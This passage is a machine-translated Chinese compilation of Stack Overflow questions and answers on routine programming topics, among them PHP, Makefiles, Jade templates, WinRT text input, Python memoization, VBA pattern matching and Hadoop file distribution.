$json = file_get_contents($url); 
$result = json_decode($json, true);
$mi = $result['rows'][0]['elements'][0]['distance']['text'];
$km = $mi*1.60934;
echo round($km)." KM <br/>";
echo $result['rows'][0]['elements'][0]['duration']['text']; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-10-20T17:26:17.960

尝试这个。确保在 URL 中使用 + 而不是空格分隔位置：

```
<?php
    $url = 'https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=Place+City&destinations=Place+City';

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $response = curl_exec($ch);
    if(curl_error($ch))
    {
        echo 'error:' . curl_error($c);
    }
    else{
        echo json_decode($response,true);
    }

    curl_close($ch);
    ?> 
```

# workflow - Alfresco Share：重命名工作流表单上的标签

> ID：10239114
> 
> 赞同：0
> 
> 时间：2012-04-20T01:39:21.617
> 
> 标签：workflow, label, alfresco

我需要重命名工作流表单上的一些标签。我想我找到了需要编辑的资源包。它是 slingshot.properties 文件。

我根据自己的喜好更改了 workflow.field.message 和 workflow.field.comment 的值并重新启动了 Alfresco，但没有任何改变。我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T16:57:07.213

1.  在 $TOMCAT_HOME/webapps/share/WEB-INF/classes/alfresco/web-extension 中，创建一个名为 custom-slingshot-application-context.xml 的新文件，其内容如下：

    > ```
    > <?xml version='1.0' encoding='UTF-8'?>
    > <!DOCTYPE beans PUBLIC '-//SPRING//DTD BEAN//EN' 'http://www.springframework.org/dtd/spring-beans.dtd'>
    > <beans>
    >     <bean id="mycustom.resources" class="org.springframework.extensions.surf.util.ResourceBundleBootstrapComponent">
    >         <property name="resourceBundles">
    >             <list>
    >                 <value>alfresco.web-extension.messages.mycustom</value>
    >             </list>
    >         </property>
    >     </bean>
    > </beans> 
    > ```

2.  在 $TOMCAT_HOME/webapps/share/WEB-INF/classes/alfresco/web-extension/messages 中，创建一个名为 mycustom.properties 的文件，其内容如下：

    > ```
    > workflow.field.message=Whatever You Want 
    > ```

3.  重启Tomcat

笔记：

*   请在 bean ID 和属性文件名中使用比“mycustom”更具描述性的内容。这只是一个例子。
*   在它们不存在的地方创建文件夹。

# c++ - 为调试/发布配置投影生成文件

> ID：10239115
> 
> 赞同：2
> 
> 时间：2012-04-20T01:39:25.393
> 
> 标签：c++, makefile

在投影生成文件方面需要您的帮助。所以，我有什么，我想得到什么。我需要构建两个可执行文件。源代码很常见。预处理器宏控制两个 exe 的差异，例如，在 main.cpp 中：

```
#if PROJECT_TYPE==FTP
std::cout << "FTP" << std::endl;
#else
std::cout << "SFTP" << std::endl;
#endif 
```

差异不仅在于源代码，还在于用于链接的其他库：

```
FTP_LDFLAGS= -static-libstdc++ -static-libgcc -s -L $(ROOT_DIR)/lib/Release -l:libboost_thread-mgw46-mt-1_49.a -l:libcommon.a \
-l:libfile.a -l:libfilesearcher.a -l:libftpclient.a -l:libftplib.a -l:libdbclient.a -l:libsqlite3.a -l:libscheduler.a -l:libws2_32.a
SFTP_LDFLAGS= -static-libstdc++ -static-libgcc -s -L $(ROOT_DIR)/lib/Release -l:libboost_thread-mgw46-mt-1_49.a -l:libcommon.a \
-l:libfile.a -l:libfilesearcher.a -l:libdbclient.a -l:libsqlite3.a -l:libscheduler.a -l:libsftpclient.a -l:libws2_32.a -l:libssh.dll 
```

我还想用自己的 CXXFLAGS 和输出目录创建调试/发布构建目标，因此得到以下结果：

```
TARGETS= ftp_auto_backup sftp_auto_backup 
```

[这里是 dirs 树的屏幕截图。](http://img594.imageshack.us/img594/400/ftpprojecttree.jpg "目录树的屏幕截图")

我想使用隐式规则进行编译，像这样：

```
%.o: %.cpp
$(CXX) -c $(CXXFLAGS) $< -o $(O_DIR)/$@ 
```

但是如何为每个目标 int $(TARGETS) 和每个构建配置指定单独的 O_DIR？我的主要问题是在这一步。我可以粘贴我现在拥有的所有 makefile，但它仍然不会构建任何东西。以防万一它是： http: [//pastebin.com/jjB5Ld1s](http://pastebin.com/jjB5Ld1s)

提前谢谢各位！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:25:40.430

有很多方法可以做到这一点。最简单的似乎是通过递归Make。（我不认为这总是一个坏主意。）

```
.PHONY: release
release: VERSION=Release

.PHONY: debug
debug: VERSION=Debug

release debug:
        @$(MAKE) -S ftp_auto_backup sftp_auto_backup VERSION=$(VERSION) 
```

现在制作可执行文件，给定`VERSION`. 我们可以使用另一层递归来处理这两种项目类型，但我们可以不使用它（我不会详细介绍预处理器宏和编译器/链接器标志，因为您似乎已经了解它们——我会如果你喜欢的话，把它们拼出来）：

```
OBJ_LIST = foo.o bar.o baz.o

ftp_auto_backup: PROJECT_TYPE=FTP
ftp_auto_backup: $(addprefix $(VERSION)/ftp_auto_backup/obj/, $(OBJ_LIST))

sftp_auto_backup: PROJECT_TYPE=SFTP
sftp_auto_backup: $(addprefix $(VERSION)/sftp_auto_backup/obj/, $(OBJ_LIST))

ftp_auto_backup sftp_auto_backup:
        @g++ -Wall $^ -o $@ with various flags

$(VERSION)/ftp_auto_backup/obj/%.o: %.cc
        @g++ -Wall -c $< -o $@ with various flags

$(VERSION)/sftp_auto_backup/obj/%.o: %.cc
        @g++ -Wall -c $< -o $@ with various flags 
```

# objective-c - clang：错误：不能同时指定“-fobjc-arc”和“-fobjc-gc”

> ID：10239116
> 
> 赞同：4
> 
> 时间：2012-04-20T01:39:25.400
> 
> 标签：objective-c, xcode4.3

我确实将**Objective-C Automatic Reference Counting**设置为**YES**，但我将 **Objective-C Garbage Collection**设置为**Unsupported**

所以我看不出如何设置 -fobjc-gc 。是否还有其他一些我没有注意到的设置？我已经尝试了一个干净的构建，所以它不会留下任何东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T16:37:02.190

I found the answer, indirectly, thanks to [this question](https://stackoverflow.com/questions/6646052/how-can-i-disable-arc-for-a-single-file-in-a-project). It turns out, that to get rid of garbage collection, I need to BOTH turn off garbage collection in the compiler settings when I click on Build Settings under the Project, and under the Target. If they disagree, the target (which is the one I didn't notice) overrides. No amount of playing with the settings at the project level was fixing that.

# javascript - 如何将对象的属性作为本地人传递给 Jade 中的包含？

> ID：10239124
> 
> 赞同：9
> 
> 时间：2012-04-20T01:40:27.167
> 
> 标签：javascript, templates, template-engine, pug

我想在循环内传递一个对象，如下所示；

**数据结构：**

```
things = [
      {
          title: 'foo'
        , description: 'bar'
      }
    , {
          title: 'baz'
        , description: 'bam'
      }
]; 
```

**index.jade:**

```
- for thing in things
    include things-template 
```

在上述格式中，我希望能够将某种参数指定为该包含的“本地”。

**东西模板.jade：**

```
li
  h3 #{title}
  p #{description} 
```

这是可能的，还是我需要将它分配给另一个变量并在我的“事物模板”中引用它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-21T22:18:41.097

作为最新的翡翠版本（0.27.4）
您可以将对象引用作为模板的同名传递

```
for thing in things
  include thing 
```

将自动将 ./thing.jade 与 thing 作为对象包含
在 thing.jade 中：

```
li
  h3 #{thing.title}
  p #{thing.description} 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-04-20T08:51:53.217

由于您想包含现有模板，我猜您没有这么多。你为什么不简单地使用 à 玉`case`块？

```
html
    body
        for thing in things
            case things-template
                when "simple"
                    include simple
                when "complexe"
                    include complexe
                default
                    include simple 
```

# c++ - C++：fmodf() & fmod() - 奇怪的结果？

> ID：10239125
> 
> 赞同：2
> 
> 时间：2012-04-20T01:40:42.127
> 
> 标签：c++, posix, modulo, gettimeofday

所以，我需要一种方法来获得当天的第二天，所以我搞砸了`fmod()`& `gettimeofday()`(Mac OSX)。然而，我在此过程中遇到了一些奇怪的结果：

```
#include <iostream>

#include <sys/time.h>
#include <cmath>

class A {
public:
    static float secondOfDayFmodF()
    {
        timeval t;
        gettimeofday(&t, NULL);

        return fmodf((t.tv_sec) + (t.tv_usec / 1000000.0), 86400);
    }

    static float secondOfDayFmod()
    {
        timeval t;
        gettimeofday(&t, NULL);

        return fmod(((t.tv_sec) + (t.tv_usec / 1000000.0)), 86400);
    }
};

using namespace std;

int main(int argc, const char *argv[])
{    
    for (int i = 0; i < 100; i++)
    {
        cout << "fmodf:\t" << A::secondOfDayFmodF() << endl;
        cout << "fmod:\t"  << A::secondOfDayFmod()  << endl;

        // sleep for 1 s
        sleep(1);
    }

    getchar();
} 
```

输出：

> fmodf: 5760
> fmod: 5699.17
> fmodf: 5760
> fmod: 5700.17
> fmodf: 5760
> fmod: 5701.17
> fmodf: 5760 fmod
> : 5702.17 fmodf: 5760 fmod: 5703.17 fmodf: 5760 fmod: 5704.17 fmodf75.7 ...

那么，为什么`fmodf()`版本每次都给我相同的输出，而`fmod()`版本给出了预期的结果（`sleep()`调用后改变）？我在文档中遗漏了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T01:58:10.423

单精度浮点数没有足够的精度将所有位存储在`(t.tv_sec) + (t.tv_usec / 1000000)`. 如果你等待的时间足够长（大约 2 分钟），你会看到一个很大的跳跃。

# jquery - 在一个页面上使用具有多个背景的 Jquery 全屏背景插件

> ID：10239129
> 
> 赞同：0
> 
> 时间：2012-04-20T01:40:57.747
> 
> 标签：jquery, background-image, fullscreen

我已经有一个带有左右箭头的 Jquery 滑块，用于使用锚点和哈希的内容，因此所有 Web 内容（页面）都在一个 html 页面上。我需要有全屏背景，我使用 CSS 得到了一些工作，但它没有显示整个图像并添加了不可接受的垂直滚动条，该版本在这里：ilandeistudio.com

所以我正在尝试使用 Jquery 的不同方法： [http ://code.ttcon.hu/fullscrn/#!/instructions](http://code.ttcon.hu/fullscrn/#!/instructions)

我可以让它工作，但我不知道如何让它与滑块/多个背景一起工作。说明说您可以稍后更改背景，只需调用 setImage 方法：

```
fullScr.setImage("images/bg_about1.jpg"); 
```

我不确定如何执行此操作或它应该去哪里。我在这里做了一个测试页：http: [//www.ilandeistudio.com/index06.html](http://www.ilandeistudio.com/index06.html)

当您单击右箭头时，我希望它像在 ilandeistudio.com 发布的第一个链接上一样更改为下一个背景

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:02:05.410

无需使用 dojo 工具包或 fullscrn 插件即可完成。

1.  将 img 放入 div，按窗口大小，固定位置，并设置 z-index:-1
2.  使用 jQuery UI $.hide() 和 $.show() 在背景中滑入和滑出。
3.  使用 jQuery $.attr() 更改 img src

例子：

```
<script>
$(function() {
    i=0;j=0;
    $("#sin").click(function(event) {
        if (i = i ? 0 : 1) $("#bgimg").show("slide", { direction: "right" }, 1000);
        else $("#bgimg").hide("slide", { direction: "right" }, 1000);
    });
    $("#changebg").click(function(event) {
        bgs = ['http://www.google.com/images/srpr/logo3w.png', 'http://col.stc.s-msn.com/br/sc/i/icons/BING_websearch_2.jpg'];
        $("#bgimg").attr('src', bgs[j = j ? 0 : 1]);
    });
});
</script>
<style>
#bg{z-index:-1;position:fixed;top:0;left:0;height:100%;width:100%;}
#bgimg{height:100%;width:100%;}
</style>
<button id="sin">Slide</button><button id="changebg">Change bg</button>

<div id="bg"><img src="http://www.google.com/images/srpr/logo3w.png" id="bgimg" /></div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T02:37:37.087

我检查了这个 html 的提琴手。

[http://dl.dropbox.com/u/14028956/index06.html.txt](http://dl.dropbox.com/u/14028956/index06.html.txt)

```
<script type="text/javascript">
dojo.require("dojo.NodeList-manipulate");
dojo.require("ttcon.fullscrn");
dojo.ready(function() {
    var fullScr = new ttcon.fullscrn({
      image: "images/bg_home1.jpg"
    });
    dojo.query(".special-anchor").onclick(function(){
      if(/home/.test(location.hash)){
        fullScr.setImage("images/bg_home1.jpg");
        return;
      }
      if(/about/.test(location.hash)){
        fullScr.setImage("images/bg_about1.jpg");
        return;
      }
    });
});
</script> 
```

阅读参考和文档。

*   [http://code.ttcon.hu/fullscrn/#!/instructions](http://code.ttcon.hu/fullscrn/#!/instructions)
*   [https://github.com/tcsizmadia/fullscrn](https://github.com/tcsizmadia/fullscrn)
*   [http://dojotoolkit.org/api/1.7/dojo/NodeList](http://dojotoolkit.org/api/1.7/dojo/NodeList)

为什么使用了这么多 JavaScript 库:(

# multithreading - 在多线程读取操作期间是否需要锁定？

> ID：10239134
> 
> 赞同：0
> 
> 时间：2012-04-20T01:41:25.827
> 
> 标签：multithreading, locking

比如说，我的应用程序有 n 个线程试图读取同一个集合对象，比如一个列表。会不会有任何比赛规则或死锁或任何类似的问题？换句话说，是否有必要锁定 List 以进行只读操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T05:56:19.000

是否要限制用户数量完全取决于您。正常情况下，如果你在 Windows 中看到 Excel 文件，当它通过网络共享时，一次最多可以打开 10 人阅读。这个数字可以增加到任何数字，或者就此而言根本不需要任何限制。想不想限制，是你作为程序员的心愿。您唯一需要记住的是，如果文件在服务器上，并且如果每秒有 100 万个读取请求，如果没有施加限制，那么您的系统很可能会变慢并且不会能够为任何人服务。相反，如果您施加锁定，说一次只有 100 个用户可以读取它，您可以确保您的系统不会过载。这是我正在解释的最坏情况下的实时场景。

但是，如果您只是为了学习而要求它，我会说它不是必需的。如果 n 个用户打开同一个文件进行阅读，理想情况下，您可以授予所有 n 个用户读取集合对象的权限。不需要同步机制。当没有同步时，就不会有死锁或任何东西。

希望这能消除您的困惑。谢谢。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:48:14.667

除非读取操作导致集合对象的内部状态更改，否则没有必要。

# android - ListPopupWindow: setWidth, setHeight 没有效果

> ID：10239144
> 
> 赞同：1
> 
> 时间：2012-04-20T01:42:57.543
> 
> 标签：android, view, popupwindow

我正在尝试设置 ListPopupWindow 的宽度和高度，但没有成功。我阅读了有关 LayatParams 的信息，但 ListPopupWindow 没有 setLayoutParams。如何设置这些参数？

```
ListPopupWindow lpw = new ListPopupWindow(TestActivity.this);
CustomAdapter stringAdapter = new CustomAdapter(TestActivity.this, R.layout.row,strings);
lpw.setAdapter(stringAdapter);
lpw.setAnchorView(v);
lpw.setWidth(150);
lpw.setHeight(300);
lpw.show(); 
```

其中 v 是一个按钮。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T04:16:13.773

下面的代码对我来说工作得很好。

```
String[] listItems = {"item 1", "item 2 ", "list", "android", "item 3", "foobar", "bar", };
@SuppressWarnings({ "unchecked", "rawtypes" })
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    Button btn=(Button)findViewById(R.id.btnwillappear);
    btn.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            ListPopupWindow lpw = new ListPopupWindow(Test_listpopActivity.this);
            lpw.setAdapter(new ArrayAdapter(Test_listpopActivity.this,  android.R.layout.simple_list_item_1, listItems));
            lpw.setAnchorView(findViewById(R.id.txtwillappear));
            lpw.setWidth(150);
            lpw.setHeight(300);
            lpw.show();

        }
    });

} 
```

有两个可能的问题。第一个是您的适配器，第二个是您的代码正在执行的位置。对于后者，请确保您的代码不在 onCreate 中。

# c# - 限制文本框中的字符

> ID：10239145
> 
> 赞同：6
> 
> 时间：2012-04-20T01:43:00.993
> 
> 标签：c#, windows-8, microsoft-metro, windows-runtime

我正在 C# WinRT 应用程序中构建一个表单，我想将其中一个 TextBox 组件中的字符限制为仅数字。（这个文本框是供用户输入一年的。）

我已经搜索了一段时间，但是如果没有在事件上设置事件侦听器并在每次按键时`TextChanged`检查属性，就无法弄清楚这一点。`text`有没有办法简单地说用户只能在 TextBox 中输入特定字符？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T03:07:52.217

可能可行的最简单的事情是绑定到`OnTextChanged`事件并根据您的规则修改文本。

```
 <TextBox x:Name="TheText" TextChanged="OnTextChanged" MaxLength="4"/> 
```

```
 private void OnTextChanged(object sender, TextChangedEventArgs e)
    {
        if (TheText.Text.Length == 0) return;

        var text = TheText.Text;

        int result;
        var isValid = int.TryParse(text, out result);
        if (isValid) return;

        TheText.Text = text.Remove(text.Length - 1);
        TheText.SelectionStart = text.Length;
    } 
```

但是，我会回避这种方法，因为 Metro 的口号是*触摸优先 UI*，您可以使用控件以触摸优先的方式轻松完成[`FlipView`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.xaml.controls.flipview.aspx)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-20T08:05:30.857

尝试将[TextBox.InputScope](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/windows.ui.xaml.controls.textbox.inputscope.aspx)属性设置为 InputScopeNameValue.Number，如MSDN[中的文本输入指南和清单中所述。](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/Hh738358%28v=win.10%29.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T02:23:45.070

有效年份

```
DateTime newDate;
var validYear = DateTime.TryParseExact("2012", "yyyy", CultureInfo.InvariantCulture, 
DateTimeStyles.None, out newDate); //valid 
```

无效年份

```
var validYear = DateTime.TryParseExact("0000", "yyyy", CultureInfo.InvariantCulture, 
DateTimeStyles.None, out newDate); //invalid 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T18:09:29.613

这似乎对我有用：

```
 private void TextBox_KeyDown(object sender, KeyRoutedEventArgs e)
    {
        if ((e.Key < VirtualKey.Number0) || (e.Key > VirtualKey.Number9))
        {
            // If it's not a numeric character, prevent the TextBox from handling the keystroke
            e.Handled = true;
        }
    } 
```

有关所有值，请参阅[VirtualKey 枚举的文档。](http://msdn.microsoft.com/en-us/library/windows/apps/windows.system.virtualkey.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-02T19:41:33.550

基于[链接](http://social.msdn.microsoft.com/Forums/en-US/winappswithcsharp/thread/e397e594-83c7-4655-99fc-ea9c6fcb64c3/ "发帖")上的帖子，添加选项卡以允许导航。

```
private void decimalTextBox_KeyDown(object sender, KeyRoutedEventArgs e)
    {
        bool isGoodData;    // flag to make the flow clearer.
        TextBox theTextBox = (TextBox)sender;  // the sender is a textbox

        if (e.Key>= Windows.System.VirtualKey.Number0 && e.Key <= Windows.System.VirtualKey.Number9)  // allow digits
            isGoodData = true;
        else if (e.Key == Windows.System.VirtualKey.Tab)
            isGoodData = true; 
        else if (e.Key >= Windows.System.VirtualKey.NumberPad0 && e.Key <= Windows.System.VirtualKey.NumberPad9)  // allow digits
            isGoodData = true;
        else if (e.Key == Windows.System.VirtualKey.Decimal || (int)e.Key == 190)   // character is a decimal point, 190 is the keyboard period code
                                                                                    // which is not in the VirtualKey enumeration
        {
            if (theTextBox.Text.Contains("."))   // search for a current point
                isGoodData = false;    // only 1 decimal point allowed
            else
                isGoodData = true;     // this is the only one.
        }
        else if (e.Key == Windows.System.VirtualKey.Back)  // allow backspace
            isGoodData = true;
        else
            isGoodData = false;   // everything else is bad
        if (!isGoodData)          // mark bad data as handled
            e.Handled = true;
    } 
```

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-04-20T01:46:34.503

使用 MaskedTextBox 控件。仅对于数字，只需使用 Mask 属性来指定字符和长度（如果有）。例如，如果您只想输入五个数字，则将掩码属性设置为“00000”。就那么简单。Windows 会为您处理限制。

# php - PHP - 页面被浏览了多少次

> ID：10239146
> 
> 赞同：1
> 
> 时间：2012-04-20T01:43:17.027
> 
> 标签：php, javascript, html, css, include

我希望 PHP 能够回显页面被查看的次数。作为服务器端脚本语言，我相当有信心有办法。

这就是我在想...

主文件

```
<body>
<?php
include("views.php");
$views = $views + 1;
echo $views;
?>
</body> 
```

意见.php

```
<?php $views = 0; ?> 
```

这有效，但不更新。（它将显示 1，但不会在刷新时继续计数。）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T01:48:02.380

问题是变量`$views`不会在视图之间持续存在。事实上，下次有人回到您的网站时，您的网站`$views`将被重置为 0。您需要查看某种形式的持久性来存储浏览总数。

实现此目的的一种方法是使用数据库或通过文件。如果您正在使用文件，您可以在 views.php 文件中执行以下操作。

**意见.php**

```
$views = 0;
$visitors_file = "visitors.txt";

// Load up the persisted value from the file and update $views
if (file_exists($visitors_file))
{
    $views = (int)file_get_contents($visitors_file) 
}

// Increment the views counter since a new visitor has loaded the page
$views++;

// Save the contents of this variable back into the file for next time
file_put_contents($visitors_file, $views); 
```

**主文件**

```
include("views.php");
echo $views; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T01:46:41.490

您需要将数据*存储*在某处。变量不会在请求之间保持其状态。`$views = 0`总是意味着`$views = 0`，无论该变量是否存在`included`。

将视图数写入文件 ( `file_put_contents`, `file_get_contents`) 或数据库以永久存储它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T01:47:04.470

刷新页面时，不会保存状态。`$views`每次开始时将其设置为 0，并以 1 递增。

要增加计数并保存值，您将需要使用数据库或文件来保存该数字。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T02:12:16.550

好主意是使用像 MySQL 这样的数据库。Internet上有很多文章如何设置它并与PHP一起使用。

您可能想要做的 - 每次访问页面时更新“视图”中的页面行。最简单的方法是这样的：

```
<?php
/* don't forget to connect and select a database first */
$page = 'Home Page'; // Unique for every page
mysql_query("UPDATE views SET num = num + 1 WHERE page = '$page'"); 
```

# python - 试图理解 Python 记忆化代码片段

> ID：10239151
> 
> 赞同：4
> 
> 时间：2012-04-20T01:44:15.340
> 
> 标签：python, function, memoization

在最近的一期[Hacker Newsletter](http://www.hackernewsletter.com/)中，链接了[这篇](http://www.thumbtack.com/engineering/a-primer-on-python-decorators/)关于 Python 装饰器的非常有用的文章。我喜欢这篇文章，并且我认为我理解了大部分装饰器示例。但是，在非装饰器记忆示例中，我对代码感到非常困惑：

```
def memoize(fn):
    stored_results = {}

    def memoized(*args):
        try:
            # try to get the cached result
            return stored_results[args]
        except KeyError:
            # nothing was cached for those args. let's fix that.
            result = stored_results[args] = fn(*args)
            return result

    return memoized 
```

我对这个函数如何创建一个`stored_results`附加的持久字典感到困惑。重新阅读后，将其复制/粘贴到我的编辑器中并使用它，并在网上寻求帮助，我仍然不明白语法`stored_results[args] = fn(*args)`的真正作用。

(1) 文章建议上述代码将返回函数，但现在它会先搜索字典，然后再执行新参数。这是怎么发生的？为什么不`stored_results`只是本地的`memoize`？为什么它在`memoized`返回时不会被销毁？

(2) 链接到其他问题或网络资源来解释此处传递的论点`*args`也会有所帮助。如果`*args`是一个参数*列表*，为什么我们可以使用语法 `stored_results[args]`，当您尝试在列表中索引字典时通常会遇到不可散列的错误？

感谢任何澄清的想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T01:47:08.007

> 如果`*args`是一个参数列表，为什么我们可以使用语法`stored_results[args]`，当您尝试在列表中索引字典时通常会遇到不可散列的错误？

因为它不是一个列表，它是一个元组。列表是可变的，因此您无法在它们上定义有意义的哈希函数。然而，元组是不可变的数据结构。

> 为什么 stored_results 不只是本地的`memoize`？为什么它在`memoized`返回时不会被销毁？

因为`memoize`和`memoized`共享同名上下文（闭包）。闭包仍然存在，因为`memoized`持有对它的引用，然后您将其返回并将其分配给全局名称（这是装饰器语句的效果）。通过关闭，所有捕获的值也将保持不变。

# regex - 需要识别邮政编码范围

> ID：10239154
> 
> 赞同：5
> 
> 时间：2012-04-20T01:44:24.187
> 
> 标签：vba, regex, string, vba, range

我对[vba](/questions/tagged/vba "显示标记为“vba”的问题")很陌生，我试图弄清楚如何识别一个字符变化范围内的邮政编码。

例如，我想查看邮政编码是否介于`2G8`和之间`2P8`。

换句话说，我正在寻找的范围是`2_8`下划线*可以*到`G`的位置`P`，但我不知道如何在代码中识别它。

我真的很感激一些帮助来弄清楚如何解决这个问题。谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-20T02:31:51.313

`LIKE`避免重复的字符串测试

**1\. 简单测试**

```
Function ValidString(strIn As String) As Boolean
ValidString = strIn Like "2[G-P]8"
End Function 
```

**2.不区分大小写的版本**

```
Function ValidString(strIn As String) As Boolean
ValidString = LCase$(strIn) Like LCase$("2[G-P]8")
End Function 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-20T01:47:29.817

您可以利用 VBA`Mid`功能提取每个字符并根据您的业务规则对其进行验证。这是它的外观示例：

```
Function ValidatePostalCode(code As String)
    ValidatePostalCode = _
        (Mid(code, 1, 1) = "2") And _
        (Mid(code, 2, 1) >= "G" And Mid(code, 2, 1) <= "P") And _
        (Mid(code, 3, 1) = "8")
End Function 
```

此函数将返回一个值`True`或`False`指示输入是否有效。

# javascript - XUL 文本框 setSelectionRange

> ID：10239158
> 
> 赞同：1
> 
> 时间：2012-04-20T01:44:35.263
> 
> 标签：javascript, xul, xulrunner

我想知道文本框的常规 setSelectionRange 是否在新的 Firefox 夏季中不起作用。在 MDN 站点（Mozilla 开发者中心）中，它被指定为：

> setSelectionRange( start, end ) 返回类型：无返回值 设置文本框的选定部分，其中 start 参数是要选择的第一个字符的索引，end 参数是选择后字符的索引。将两个参数设置为相同的值以将光标移动到相应的位置而不选择文本。

```
<?xml-stylesheet href="chrome://global/skin/" type="text/css"?>
<window id="yourwindow"
        xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul"
        xmlns:html="http://www.w3.org/1999/xhtml"
        xmlns:h="http://www.w3.org/1999/xhtml">

<button label="x"  oncommand="sel()"  />

<textbox id="id" multiline="true"  
         value="This is some text that could wrap onto multiple lines."/>  

<script type="text/javascript">
<![CDATA[
function sel(){
var textbox = document.getElementById("id");
textbox.setSelectionRange( 1 , 2 );
}
]]>
</script>
</window> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T11:31:07.890

The function works just fine. However, when you click a button the input focus is (logically) on the button and `setSelectionRange` won't change that. You can press `Tab` to select the text field and make the selection visible. Alternatively, you can also add this line to your `sel()` function to focus the text field:

```
textbox.focus(); 
```

# ios - 为弹出视图自定义 UIPopoverControllers 的外观

> ID：10239160
> 
> 赞同：0
> 
> 时间：2012-04-20T01:44:54.440
> 
> 标签：ios, uipopovercontroller, customization, popover

我一直在研究在这篇文章中用 IBAction 和 NIB 解决的同一个难题：

[UIPopover 自定义 Post on stackoverflow](https://stackoverflow.com/questions/8490261/change-color-navigation-controller-in-a-popover/10234621#10234621)

我想知道，这是否可以以及如何使用按钮或其他控件的 segue 来实现？我的segue似乎没有使以下行生效：

```
$popover.popoverBackgroundViewClass=[CustomPopoverBackgroundView class]; 
```

因为我的 custompopover.h 或 .m 代码都没有加载或被调用。有人愿意告诉我我实施得不好的地方吗？

此外，我使用了本教程中的一些内容，但我似乎仍然想念如何正确实现这一点：

[thinkvitamin 教程贴](http://thinkvitamin.com/code/ios/customizing-the-design-of-uipopovercontroller/)

感谢您的关注！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:18:22.670

这样的事情怎么样？

```
- (IBAction)yourAction:(id)sender {

UIStoryboard *myStoryboard = self.storyboard;
ViewController *myViewController = [myStoryboard instantiateViewControllerWithIdentifier:@"ViewController"]; // Identifier of the vc in attributes inspector, throws exception if not filled in!

//Set myViewController properties here

UIPopoverController *myPopover = [[UIPopoverController alloc] initWithContentViewController:myViewController];
myPopover.popoverBackgroundViewClass = [CustomPopoverBackgroundView class]; 

[myPopover presentPopoverFromRect:CGRectMake(0,0,100,100) inView:self.view permittedArrowDirections:0 animated:YES]; 
} 
```

# hadoop - How to set -file option for java hadoop?

> ID：10239161
> 
> 赞同：0
> 
> 时间：2012-04-20T01:45:00.133
> 
> 标签：hadoop

How do i copy a file that is required for a hadoop program, to all compute nodes? I am aware that -file option for hadoop streaming does that. How do i do this for java+hadoop?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T01:57:22.307

Exactly the same way.

Assuming you use the ToolRunner / Configured / Tool pattern, the files you specify after the -files option will be in the local dir when your mapper / reducer / combiner tasks run:

```
public class Driver extends Configured implements Tool {
    public static void main(String args[]) {
        ToolRunner.run(new Driver(), args);
    }

    public int run(String args[]) {
        Job job = new Job(getConf());
        // ...
        job.waitForCompletion(true);
    }
}

public class MyMapper extends Mapper<K1, V1, K2, V2> {
    public void setup(Context context) {
        File myFile = new File("file.csv");
        // do something with file
    }

    // ...
} 
```

You can then execute with:

```
#> hadoop jar myJar.jar Driver -files file.csv ...... 
```

See the Javadoc for [GenericOptionsParser](http://hadoop.apache.org/common/docs/current/api/org/apache/hadoop/util/GenericOptionsParser.html) for more info

# php - 拆分数组 - 丢弃低于某个值的键？

> ID：10239164
> 
> 赞同：1
> 
> 时间：2012-04-20T01:45:46.343
> 
> 标签：php, arrays

我有一个数组，假设键是：100、512、610、21、176、64。如果需要，我总是可以对数组进行排序。

我想去掉键值低于某个值的数组值，比如低于 110。那将去掉 100、21 和 64。

我想在不使用 foreach 的情况下做到这一点。有没有我可以使用的功能，我可以在其中对数组进行排序，找到拼接点，然后从那里一举删除该通道？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T01:49:34.470

循环确实是最直接的方法。不过为了好玩，这里有一个没有（可见）循环的解决方案：

```
$array = array_intersect_keys(
    $array,
    array_flip(array_filter(
        array_keys($array),
        function ($key) { return $key > 110; }
    ))
); 
```

也许您应该改用循环。

# .htaccess - 将新域名重定向到 .htaccess 中的现有网站？

> ID：10239165
> 
> 赞同：0
> 
> 时间：2012-04-20T01:45:48.273
> 
> 标签：.htaccess, redirect, domain-name, multiple-domains

